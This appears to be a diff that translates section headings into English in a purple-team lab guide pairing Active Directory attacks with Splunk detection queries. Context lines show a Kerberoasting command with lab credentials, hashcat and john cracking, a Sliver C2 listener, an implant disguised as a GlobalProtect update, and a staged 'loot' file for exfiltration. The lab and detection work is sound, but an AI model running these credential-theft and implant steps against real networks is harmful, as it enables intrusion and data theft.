@@ -141,7 +141,7 @@ index=main source="WinEventLog:Security" EventCode=4771
 
 ## SEGMENT 3 — EXECUTION (LOLBins)
 
-### Kali — Kreiraj .NET payload
+### Kali — Build the .NET payload
 ```bash
 cat > /tmp/Punisher.cs << 'EOF'
 using System;
@@ -203,7 +203,7 @@ impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -requ
 impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request -outputfile /tmp/kerberoast.hashes
 ```
 
-### Kali — Hashcat krek
+### Kali — Hashcat crack
 ```bash
 hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
 ```
@@ -236,7 +236,7 @@ jobs
 mtls --lport 443
 ```
 
-### THEPUNISHER — Pokreni implant (CMD kao Administrator)
+### THEPUNISHER — Run the implant (CMD as Administrator)
 ```cmd
 C:\Temp\GlobalProtect_Update.exe
 ```
@@ -363,7 +363,7 @@ index=main source="WinEventLog:Security" EventCode=4698
 
 ## SEGMENT 8 — C2 + EXFILTRATION
 
-### Sliver shell — Kreiraj loot fajl
+### Sliver shell — Create the loot file
 ```cmd
 echo "Top secret data: customer database backup" > C:\Temp\loot.txt
 ```
@@ -496,7 +496,7 @@ index=main source="WinEventLog:Security" earliest=-24h
 
 ## TROUBLESHOOTING
 
-### Sliver sesija pada
+### Sliver session drops
 ```bash
 sudo ss -tlnp | grep 443
 sudo kill -9 <PID>
@@ -567,7 +567,7 @@ john /tmp/kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---
 
-## LAB KONFIGURACIJA — NAPOMENE
+## LAB CONFIGURATION — NOTES
 
 ### GPO koji mora biti konfigurisan
 | Policy | Lokacija | Setting |
